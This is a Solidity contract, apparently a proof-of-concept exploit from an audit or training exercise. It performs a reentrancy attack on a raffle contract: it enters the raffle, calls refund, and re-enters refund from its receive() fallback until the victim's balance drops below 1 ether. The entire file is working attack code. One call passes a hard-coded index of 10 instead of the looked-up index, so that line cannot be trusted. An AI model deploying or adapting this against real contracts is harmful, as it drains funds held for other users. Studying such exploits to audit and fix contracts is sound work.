// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
        
contract ReentrancyAttacker {
    address private exploitableAddress;

    constructor(address victimAddress) {
        exploitableAddress = victimAddress;
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);

        exploitableAddress.call{ value: address(this).balance }(abi.encodeWithSignature("enterRaffle(address[])", players));

        (bool success, bytes memory data) = exploitableAddress.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
        (uint256 attackerIndex) = abi.decode(data, (uint256)); 

        (bool _success, bytes memory _data) = exploitableAddress.call(abi.encodeWithSignature("refund(uint256)", 10));
    }

    function fundAttacker() public payable {}

    receive() external payable {
        if(address(exploitableAddress).balance >= 1 ether) {
            (bool success, bytes memory data) = exploitableAddress.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
            (uint256 attackerIndex) = abi.decode(data, (uint256)); 
            exploitableAddress.call(abi.encodeWithSignature("refund(uint256)", attackerIndex));
        }
    }
}
